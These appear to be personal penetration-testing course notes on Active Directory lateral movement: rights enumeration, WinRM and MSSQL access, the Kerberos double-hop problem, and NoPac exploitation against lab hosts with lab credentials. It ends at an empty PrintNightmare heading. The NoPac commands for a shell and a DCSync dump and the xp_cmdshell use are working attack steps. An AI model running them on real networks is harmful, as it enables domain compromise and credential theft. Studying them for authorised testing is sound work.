# Privileged Access

We can enumerate this access in various ways. The easiest, once again, is via BloodHound, as the following edges exist to show us what types of remote access privileges a given user has:

- [CanRDP](https://bloodhound.specterops.io/resources/edges/can-rdp)
- [CanPSRemote](https://bloodhound.specterops.io/resources/edges/can-ps-remote)
- [SQLAdmin](https://bloodhound.specterops.io/resources/edges/sql-admin)

We can also enumerate these privileges using tools such as PowerView and even built-in tools.
#### Enumerating a Local Group on a Host

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```
#### Checking Remote Access Rights using BloodHound

We can utilize BloodHound Built-in queries such as `Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`

## WinRM
#### Enumerating the Remote Management Users Group

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

We can also right a custom **Cipher Query** in `BloodHound` to hunt for users with this type of access.

```powershell
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```
#### Establishing WinRM Session from Windows

```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)

Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

From the Linux host we can use `evil-winrm` tool.

## SQL Server Admin

A custom Cipher query on BloodHound to find `SQL Admin Rights`

```powershell
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

```ad-resources
[PowerUpSQL Cheat Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
```

#### Enumerating MSSQL Instances with PowerUpSQL

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```

```powershell
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

We can also use `Impacket mssqlclient.py`

```sh
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

We can run commands in the format `xp_cmdshell <command>`. Here we can enumerate the rights that our user has on the system and see that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which can be leveraged in combination with a tool such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato) to escalate to `SYSTEM` level privileges, depending on the target host, and use this access to continue toward our goal.

---

# Kerberos "Double Hop" Problem

**1. The Core Problem:**
- Occurs when trying to authenticate from one remote machine to another (e.g., Attacker -> Server A -> Server B).
- Even with valid credentials and permissions, the second "hop" (Server A -> Server B) fails.
- Commonly seen with WinRM/PowerShell remote sessions.

**2. The Cause (Why it Happens with WinRM/Kerberos):**
- WinRM uses Kerberos authentication, which provides a **service ticket** specific to the first hop (Server A).
- Crucially, the user's credentials (like a password or NTLM hash) are **not cached** in the remote session on Server A.
- Without cached credentials, Server A cannot prove the user's identity to Server B. It only has a ticket valid for itself.

**3. Comparison with Other Authentication Methods (e.g., PSExec):**
- Tools like PSExec often use authentication methods (like SMB) that **do cache the user's NTLM hash** in memory on the remote machine (Server A).
- When a second hop is attempted, Server A can use this cached hash to authenticate to Server B on the user's behalf.
- This is why the "Double Hop" problem is less common with tools like PSExec but frequent with default WinRM sessions.
## Workarounds

```ad-resources
[Kerberos Double-Hop Workarounds](https://posts.slayerlabs.com/double-hop/)
```
### Workaround #1: PSCredential Object

We can connect to *Remote Host* via *Host A* and set up `PSCredentials` Object to pass our credentials again.
### Workaround #2: Register PSSession Configuration

We can use here is registering a new session configuration using the [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) cmdlet.

```PowerShell
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
```

Once this is done, we need to restart the WinRM Service by typing:

```PowerShell
Restart-Service WinRM
```

We can also use other methods such as CredSSP, port forwarding, or injecting into a process running in the context of a target user.

---
# Bleeding Edge Vulnerabilities
## NoPac (SamAccountName Spoofing)
This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.

|42278|42287|
|---|---|
|`42278` is a bypass vulnerability with the Security Account Manager (SAM).|`42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.|
We can use this [tool](https://github.com/Ridter/noPac) to perform this attack.
#### Scanning for NoPac

```sh
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
#### Running NoPac & Getting a Shell

```sh
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
#### Using noPac to DCSync the Built-in Administrator Account

```sh
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

## PrintNightmare